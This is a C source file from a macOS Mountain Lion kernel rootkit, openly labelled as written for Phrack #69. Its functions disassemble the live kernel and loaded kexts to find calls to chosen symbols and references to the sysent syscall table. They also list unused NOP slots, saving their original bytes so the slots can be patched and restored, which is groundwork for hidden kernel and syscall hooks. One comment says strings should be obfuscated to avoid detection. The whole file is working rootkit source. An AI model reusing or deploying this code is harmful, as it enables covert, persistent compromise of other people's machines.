/*
 *   _____   _                          ___     _      _  _     _              __ _
 *  |_   _| | |_      ___      o O O   | __|   | |    | || |   (_)    _ _     / _` |
 *    | |   | ' \    / -_)    o        | _|    | |     \_, |   | |   | ' \    \__, |
 *   _|_|_  |_||_|   \___|   TS__[O]  _|_|_   _|_|_   _|__/   _|_|_  |_||_|   |___/
 * _|"""""|_|"""""|_|"""""| {======|_| """ |_|"""""|_| """"|_|"""""|_|"""""|_|"""""|
 * "`-0-0-'"`-0-0-'"`-0-0-'./o--000'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'
 *            ___      _
 *    o O O  / __|    (_)      _ _    __     _  _     ___
 *   o      | (__     | |     | '_|  / _|   | +| |   (_-<
 *  TS__[O]  \___|   _|_|_   _|_|_   \__|_   \_,_|   /__/_
 *  {======|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|
 * ./o--000'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'
 *
 * And now for something completely different...
 *
 * A Mountain Lion rootkit for Phrack #69!
 *
 * Copyright (c) fG!, 2012, 2013 - reverser@put.as - http://reverse.put.as
 * All rights reserved.
 *
 * disasm_utils.c
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 * notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 * notice, this list of conditions and the following disclaimer in the
 * documentation and/or other materials provided with the distribution.
 * 3. The name of the author may not be used to endorse or promote products
 * derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
 * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
 * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
 * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 */

#include "disasm_utils.h"

#include <kern/thread.h>
#include <libkern/libkern.h>
#include <mach-o/loader.h>
#include <sys/systm.h>
#include <mach/mach_types.h>

#include "distorm.h"
#include "mnemonics.h"
#include "kernel_info.h"
#include "utlist.h"
#include "configuration.h"

#define MAX_INSTRUCTIONS 8192

extern struct kernel_info g_kernel_info;

/*
 * disassemble the whole kernel and lookup for call refs to the given symbol
 * first we solve the symbol so we can have its address
 * then we disassemble and compute the destination of each call address
 * if it matches with the symbol then we found the reference(s) we want
 */
int
find_symbol_refs(char *symbol, struct xrefs **list)
{
    int xrefs_count = 0;
    // get a pointer to the kernel __text section, which is the buffer we want to disassemble
    unsigned char *kernel_buf = (unsigned char*)(g_kernel_info.running_text_addr);
    if (kernel_buf == NULL)
    {
#if DEBUG
        //moony_modify//printf("[ERROR] Running text address points to NULL?!?\n");
#endif
        return -1;
    }
    // allocate space for disassembly output
    _DInst *decodedInstructions = _MALLOC(sizeof(_DInst) * MAX_INSTRUCTIONS, M_TEMP, M_WAITOK);
    if (decodedInstructions == NULL)
    {
#if DEBUG
        //moony_modify//printf("[ERROR] Decoded instructions allocation failed!\n");
#endif
        return -1;
    }
    
    mach_vm_address_t symbol_address = solve_kernel_symbol(&g_kernel_info, symbol);
    
    unsigned int decodedInstructionsCount = 0;
	_DecodeResult res = 0;    
    _CodeInfo ci;
    ci.dt = Decode64Bits;
    ci.features = DF_NONE;
    ci.codeLen = (int)g_kernel_info.text_size; // kernel size should fit into a int ;-)
    ci.code = kernel_buf;
    ci.codeOffset = g_kernel_info.running_text_addr; // running kernel address so offsets are ok (aslr enabled)
    mach_vm_address_t next;

    while (1)
    {
        res = distorm_decompose(&ci, decodedInstructions, MAX_INSTRUCTIONS, &decodedInstructionsCount);
        if (res == DECRES_INPUTERR)
        {
            // Error handling...
#if DEBUG
            //moony_modify//printf("[ERROR] Distorm failed to disassemble!\n");
#endif
            goto failure;
        }
        // iterate over the disassembly and lookup for CALL instructions
        for (int i = 0; i < decodedInstructionsCount; i++)
        {
            if (decodedInstructions[i].opcode == I_CALL || decodedInstructions[i].opcode == I_JMP)
            {
                // retrieve the target address and see if it matches the symbol we are looking for
                mach_vm_address_t rip_address = INSTRUCTION_GET_TARGET(&decodedInstructions[i]);
                if (rip_address == symbol_address)
                {
                    struct xrefs *new = _MALLOC(sizeof(struct xrefs), M_TEMP, M_WAITOK);
                    if (new != NULL)
                    {
                        new->address = decodedInstructions[i].addr;
                        new->size    = decodedInstructions[i].size;
                        LL_PREPEND(*list, new);
                        xrefs_count++;
#if DEBUG
//                        //moony_modify//printf("[DEBUG] found call at %llx\n", decodedInstructions[i].addr - g_kernel_info.kaslr_slide);
#endif
                    }
                }
            }        
        }
        
        if (res == DECRES_SUCCESS) break; // All instructions were decoded.
        else if (decodedInstructionsCount == 0) break;
        // sync the disassembly
        // the total number of bytes disassembly to previous last instruction
        next = decodedInstructions[decodedInstructionsCount-1].addr  - ci.codeOffset;
        // add points to the first byte so add instruction size to it
        next += decodedInstructions[decodedInstructionsCount-1].size;
        // update the CodeInfo struct with the synced data
        ci.code += next;
        ci.codeOffset += next;
        ci.codeLen -= next;
    }

end:
    _FREE(decodedInstructions, M_TEMP);
    return xrefs_count;
failure:
    _FREE(decodedInstructions, M_TEMP);
    return -1;
}

/*
 * create a list of NOPs available in kernel __text section
 * size match will always be equal or higher
 * req_count is the number we of spots we want
 * it will stop when this number is reached but could be lower so check return value
 */
int
find_nop_space(const int nop_size, const int req_count, struct nops **list)
{
    int nops_count = 0;
    // get a pointer to the kernel __text section, which is the buffer we want to disassemble
    unsigned char *kernel_buf = (unsigned char*)(g_kernel_info.running_text_addr);
    if (kernel_buf == NULL)
    {
#if DEBUG
        //moony_modify//printf("[ERROR] Running text address points to NULL?!?\n");
#endif
        return -1;
    }
    // allocate space for disassembly output
    _DInst *decodedInstructions = _MALLOC(sizeof(_DInst) * MAX_INSTRUCTIONS, M_TEMP, M_WAITOK);
    if (decodedInstructions == NULL)
    {
#if DEBUG
        //moony_modify//printf("[ERROR] Decoded instructions allocation failed!\n");
#endif
        return -1;
    }
    
    unsigned int decodedInstructionsCount = 0;
	_DecodeResult res = 0;    
    _CodeInfo ci;
    ci.dt = Decode64Bits;
    ci.features = DF_NONE;
    ci.codeLen = (int)g_kernel_info.text_size; // kernel size should fit into a int ;-)
    ci.code = kernel_buf;
    ci.codeOffset = g_kernel_info.running_text_addr; // running kernel address so offsets are ok (aslr enabled)
    mach_vm_address_t next;
    
    while (1)
    {
        res = distorm_decompose(&ci, decodedInstructions, MAX_INSTRUCTIONS, &decodedInstructionsCount);
        if (res == DECRES_INPUTERR)
        {
            // Error handling...
#if DEBUG
            //moony_modify//printf("[ERROR] Distorm failed to disassemble!\n");
#endif
            goto failure;
        }
        // iterate over the disassembly and lookup for NOP instructions
        // we only select NOPs after RET or JMP instructions because they will not be used by any code
        // there are cases where NOPs exist in the middle of functions so patching them will have catastrophic consequences
        for (int i = 0; i < decodedInstructionsCount; i++)
        {
            // diStorm shouldn't return size bigger than 15 but let's be safe here
            if (decodedInstructions[i].opcode == I_NOP && decodedInstructions[i].size >= nop_size &&
                decodedInstructions[i].size <= 15 &&
                (decodedInstructions[i-1].opcode == I_RET || decodedInstructions[i-1].opcode == I_JMP)) // previous instruction must be a RET or JMP
            {
                struct nops *new = _MALLOC(sizeof(struct nops), M_TEMP, M_WAITOK);
                if (new != NULL)
                {
                    new->address = decodedInstructions[i].addr;
                    new->size    = decodedInstructions[i].size;
                    new->used    = 0;
                    // save the original NOP bytes so we can restore them
                    memcpy(new->orig_bytes, new->address, new->size);
                    nops_count++;
                    LL_PREPEND(*list, new);
                    if (nops_count == req_count) goto end; // we have enough nops, get out of here
                }
            }
        }
        
        if (res == DECRES_SUCCESS) break; // All instructions were decoded.
        else if (decodedInstructionsCount == 0) break;
        // sync the disassembly
        // the total number of bytes disassembly to previous last instruction
        next = decodedInstructions[decodedInstructionsCount-1].addr  - ci.codeOffset;
        // add points to the first byte so add instruction size to it
        next += decodedInstructions[decodedInstructionsCount-1].size;
        // update the CodeInfo struct with the synced data
        ci.code += next;
        ci.codeOffset += next;
        ci.codeLen -= next;
    }
    
end:
    _FREE(decodedInstructions, M_TEMP);
#if DEBUG
    //moony_modify//printf("[DEBUG] Total available nops of size %d is %d\n", nop_size, nops_count);
#endif
    return nops_count;
failure:
    _FREE(decodedInstructions, M_TEMP);
    return -1;
}

/*
 * disassemble the whole kernel and lookup references to sysent pointer
 */
kern_return_t
find_sysent_xrefs(mach_vm_address_t sysent_ptr, struct xrefs **sysent_refs)
{
    // get a pointer to the kernel __text section, which is the buffer we want to disassemble
    unsigned char *kernel_buf = (unsigned char*)(g_kernel_info.running_text_addr);
    if (kernel_buf == NULL)
    {
#if DEBUG
        //moony_modify//printf("[ERROR] Running text address points to NULL?!?\n");
#endif
        return -1;
    }
    // allocate space for disassembly output
    _DInst *decodedInstructions = _MALLOC(sizeof(_DInst) * MAX_INSTRUCTIONS, M_TEMP, M_WAITOK);
    if (decodedInstructions == NULL)
    {
#if DEBUG
        //moony_modify//printf("[ERROR] Decoded instructions allocation failed!\n");
#endif
        return -1;
    }
    
    unsigned int decodedInstructionsCount = 0;
	_DecodeResult res = 0;    
    _CodeInfo ci;
    ci.dt = Decode64Bits;
    ci.features = DF_NONE;
    ci.codeLen = (int)g_kernel_info.text_size; // kernel size should fit into a int ;-)
    ci.code = kernel_buf;
    ci.codeOffset = g_kernel_info.running_text_addr; // running kernel address so offsets are ok (aslr enabled)
    mach_vm_address_t next;
    while (1)
    {
        res = distorm_decompose(&ci, decodedInstructions, MAX_INSTRUCTIONS, &decodedInstructionsCount);
        if (res == DECRES_INPUTERR)
        {
            // Error handling...
#if DEBUG
            //moony_modify//printf("[ERROR] Distorm failed to disassemble!\n");
#endif
            goto failure;
        }
        // iterate over the disassembly and lookup for ADD or CMP instructions (which are the common ones referencing sysent)
        for (int i = 0; i < decodedInstructionsCount; i++)
        {

            if (decodedInstructions[i].opcode == I_ADD || decodedInstructions[i].opcode == I_CMP)
            {
                mach_vm_address_t rip_address = INSTRUCTION_GET_RIP_TARGET(&decodedInstructions[i]);
                if (rip_address == sysent_ptr)
                {
#if DEBUG
                    //moony_modify//printf("Found sysent usage at %p\n", (void*)(decodedInstructions[i].addr));
#endif
                    struct xrefs *new = _MALLOC(sizeof(struct xrefs), M_TEMP, M_WAITOK);
                    new->address = decodedInstructions[i].addr;
                    new->size    = decodedInstructions[i].size;
                    LL_PREPEND(*sysent_refs, new);
                }
            }
        }
        
        if (res == DECRES_SUCCESS) break; // All instructions were decoded.
        else if (decodedInstructionsCount == 0) break;
        // sync the disassembly
        // the total number of bytes disassembly to previous last instruction
        next = decodedInstructions[decodedInstructionsCount-1].addr  - ci.codeOffset;
        // add points to the first byte so add instruction size to it
        next += decodedInstructions[decodedInstructionsCount-1].size;
        // update the CodeInfo struct with the synced data
        ci.code += next;
        ci.codeOffset += next;
        ci.codeLen -= next;
    }
    
end:
    _FREE(decodedInstructions, M_TEMP);
    return KERN_SUCCESS;
failure:
    _FREE(decodedInstructions, M_TEMP);
    return KERN_FAILURE;
}

/*
 * disassemble a given kext (located on base address) and lookup for call refs to the given symbol
 * first we solve the symbol so we can have its address
 * then we disassemble and compute the destination of each call address
 * if it matches with the symbol then we found the reference(s) we want
 */
int
find_kext_symbol_refs(mach_vm_address_t base_address, char *symbol, struct xrefs **list)
{
    int xrefs_count = 0;
    mach_vm_address_t kext_text = 0;
    uint64_t kext_size = 0;
    struct mach_header_64 *mh = (struct mach_header_64*)base_address;
    if (mh->magic != MH_MAGIC_64) return -1;
    // find __TEXT location
    struct load_command *load_cmd = NULL;
    char *load_cmd_addr = (char*)base_address + sizeof(struct mach_header_64);
    // iterate over all load cmds and retrieve required info to solve symbols
    // __LINKEDIT location and symbol/string table location
    for (uint32_t i = 0; i < mh->ncmds; i++)
    {
        load_cmd = (struct load_command*)load_cmd_addr;
        if (load_cmd->cmd == LC_SEGMENT_64)
        {
            struct segment_command_64 *seg_cmd = (struct segment_command_64*)load_cmd;
            // XXX: these strings should be obfuscated ;-)
            if (strncmp(seg_cmd->segname, "__TEXT", 16) == 0)
            {
                // get a pointer to the kernel __text section, which is the buffer we want to disassemble            
                kext_text = seg_cmd->vmaddr;
                kext_size = seg_cmd->vmsize;
                break;
            }
        }
        load_cmd_addr += load_cmd->cmdsize;
    }
    unsigned char *kernel_buf = (unsigned char*)kext_text; // pointer to kext __TEXT section
    if (kernel_buf == NULL)
    {
#if DEBUG
        //moony_modify//printf("[ERROR] Running text address points to NULL?!?\n");
#endif
        return -1;
    }
    // allocate space for disassembly output
    _DInst *decodedInstructions = _MALLOC(sizeof(_DInst) * MAX_INSTRUCTIONS, M_TEMP, M_WAITOK);
    //    memset(decodedInstructions, 0, sizeof(_DInst) * MAX_INSTRUCTIONS);
    if (decodedInstructions == NULL)
    {
#if DEBUG
        //moony_modify//printf("[ERROR] Decoded instructions allocation failed!\n");
#endif
        return -1;
    }
    
    mach_vm_address_t symbol_address = solve_kernel_symbol(&g_kernel_info, symbol);
    
    unsigned int decodedInstructionsCount = 0;
	_DecodeResult res = 0;    
    _CodeInfo ci;
    ci.dt = Decode64Bits;
    ci.features = DF_NONE;
    ci.codeLen = (int)kext_size; // kernel size should fit into a int ;-)
    ci.code = kernel_buf;
    ci.codeOffset = kext_text; // running kernel address so offsets are ok (aslr enabled)
    mach_vm_address_t next;
    
    while (1)
    {
        res = distorm_decompose(&ci, decodedInstructions, MAX_INSTRUCTIONS, &decodedInstructionsCount);
        if (res == DECRES_INPUTERR)
        {
            // Error handling...
#if DEBUG
            //moony_modify//printf("[ERROR] Distorm failed to disassemble!\n");
#endif
            goto failure;
        }
        // iterate over the disassembly and lookup for CALL instructions
        for (int i = 0; i < decodedInstructionsCount; i++)
        {
            if (decodedInstructions[i].opcode == I_CALL || decodedInstructions[i].opcode == I_JMP)
            {
                // retrieve the target address and see if it matches the symbol we are looking for
                mach_vm_address_t rip_address = INSTRUCTION_GET_TARGET(&decodedInstructions[i]);
                if (rip_address == symbol_address)
                {
                    struct xrefs *new = _MALLOC(sizeof(struct xrefs), M_TEMP, M_WAITOK);
                    if (new != NULL)
                    {
                        new->address = decodedInstructions[i].addr;
                        new->size    = decodedInstructions[i].size;
                        LL_PREPEND(*list, new);
                        xrefs_count++;
#if DEBUG
//                        if (decodedInstructions[i].opcode == I_CALL)
//                            //moony_modify//printf("[DEBUG] found call at %llx\n", decodedInstructions[i].addr);
//                        else
//                            //moony_modify//printf("[DEBUG] found jmp at %llx\n", decodedInstructions[i].addr);
#endif
                    }
                }
            }        
        }
        
        if (res == DECRES_SUCCESS) break; // All instructions were decoded.
        else if (decodedInstructionsCount == 0) break;
        // sync the disassembly
        // the total number of bytes disassembly to previous last instruction
        next = decodedInstructions[decodedInstructionsCount-1].addr  - ci.codeOffset;
        // add points to the first byte so add instruction size to it
        next += decodedInstructions[decodedInstructionsCount-1].size;
        // update the CodeInfo struct with the synced data
        ci.code += next;
        ci.codeOffset += next;
        ci.codeLen -= next;
    }
    
end:
    _FREE(decodedInstructions, M_TEMP);
    return xrefs_count;
failure:
    _FREE(decodedInstructions, M_TEMP);
    return -1;
}
